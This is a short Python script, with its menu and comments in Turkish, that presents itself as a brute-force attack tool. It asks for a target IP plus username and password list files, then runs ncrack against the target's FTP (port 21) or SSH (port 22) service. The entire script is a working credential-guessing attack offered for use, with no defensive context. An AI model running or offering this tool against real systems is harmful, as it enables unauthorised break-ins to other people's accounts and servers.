#!/usr/bin/env python3

import os
import subprocess

# figlet ve ncrack kurulumu
subprocess.run(["dnf", "install", "figlet", "-y"])
subprocess.run(["clear"])
subprocess.run(["figlet", "KABA KUVVET SALDIRI ARACI R00T"])

print("""
Kaba Kuvvet Aracina Hosgeldin

1) FTP
2) SSH
...
""")


islemno = input("Islem Numarasini Girin: ")
hedefip = input("Hedef Ip Girin: ")
kullaniciadi = input("Kullanici Adi Dosya Yolu Girin: ")
sifre = input("Sifre Dosya Yolu Girin: ")


if islemno == "1":
    cmd = ["ncrack", "-p", "21", "-u", kullaniciadi, "-P", sifre, hedefip]
elif islemno == "2":
    cmd = ["ncrack", "-p", "22", "-u", kullaniciadi, "-P", sifre, hedefip]
else:
    print("Geçersiz işlem numarası")
    exit(1)


subprocess.run(cmd)
